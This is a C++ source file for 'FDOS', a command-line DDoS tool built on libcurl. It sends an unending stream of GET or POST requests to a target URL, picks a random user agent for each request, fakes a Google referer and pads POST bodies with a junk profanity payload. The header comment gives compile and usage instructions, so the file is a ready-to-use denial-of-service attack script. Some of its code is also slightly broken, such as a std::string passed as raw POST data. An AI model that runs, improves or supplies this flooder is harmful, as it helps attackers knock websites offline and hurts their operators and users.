/*
FDOS - CPP VERSION

Simple DDoS Tools Using Method GET/POST

For compile use command (for GCC) : g++ fdos.cpp -o fdos -lcurl
For use : ./fdos (on linux) or fdos.exe (for windows) http://target.com <get/post> 
*/


#include <iostream>
#include <vector>
#include <random>
#include <curl/curl.h>
using namespace std;
#if defined(_WIN32)
    #include <windows.h>
#elif defined(__linux__)
    #include <unistd.h>
#endif

// handle data from request into string.
size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

// creating random useragent
string useragent(){
    // you can add user agent here if you want.
    vector<string> user_agent = {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.1", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.", "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.3"};

    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> distrib(0, user_agent.size() - 1);
    int randomselect = distrib(gen);
    return user_agent[randomselect];
}

// main function.
int main(int argc, char** argv) {
    // check website for start ddos (0 = not check, 1 = avaiable for ddos)
    int check = 0;
    if (argc < 3) {
        cerr << "use " << argv[0] << " http://target.com <get/post>" << endl;
        exit(0);
    }
    // check :// for http/https protocol on website.
    string domain = argv[1];
    if (domain.find("://") == string::npos){
        cerr << "http/https not found. please use http/https on target." << endl;
        exit(0);
    }
    string tipe = argv[2];
    CURL* curl;
    // set timeout.
    int timeout = 10;
    CURLcode res;
    string responseBuffer;
    long responseCode;
    string payload = "message=jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&jancok&"; // payload for post.
    curl_global_init(CURL_GLOBAL_DEFAULT); 
    curl = curl_easy_init();
    if (curl) {
        int sent = 0;
        while(true) {
            string user_agent = "User-Agent: " + useragent();
            if (check == 0) {
                printf("Checking Target %s....\n", domain.c_str());
            }
            
            curl_easy_setopt(curl, CURLOPT_URL, domain.c_str());
            struct curl_slist* headers = NULL;
            // headers for request
            headers = curl_slist_append(headers, user_agent.c_str());
            headers = curl_slist_append(headers, "Accept: */*");
            headers = curl_slist_append(headers, "Referer: https://www.google.com");
            headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
            headers = curl_slist_append(headers, "Cache-Control: max-age=0");
            headers = curl_slist_append(headers, "Connection: Keep-Alive");
            // add var payload into request post (only if tipe ddos is post)
            if (tipe == "post") {
                
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
            }
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseBuffer);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, timeout);
            
            
            res = curl_easy_perform(curl);
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &responseCode);

            // checking target avaiable for ddos or not.
            if (check == 0) {

                if (res != CURLE_OK) {
                    fprintf(stderr, "Connection to target failed : %s\n", curl_easy_strerror(res));
                    exit(0);
                } else if(res == CURLE_OPERATION_TIMEDOUT) {
                    cerr << "Time out. Sleeping " << timeout << " Second" << endl;
                    sleep(timeout);
                } else {
                    //cout << "Attacking..." << endl;
                    printf("Status code : %i\n", responseCode);
                }
                printf("Attacking...");
                check = 1;
            }
            if (res != CURLE_OK) {
                fprintf(stderr, "Connection to target failed : %s\n", curl_easy_strerror(res));
                sleep(timeout);
            }
            printf("Sent %i\n", sent);
            sent++;
            responseBuffer.clear();
    
        
        }
        curl_easy_cleanup(curl);
    

        return 0;
    }
}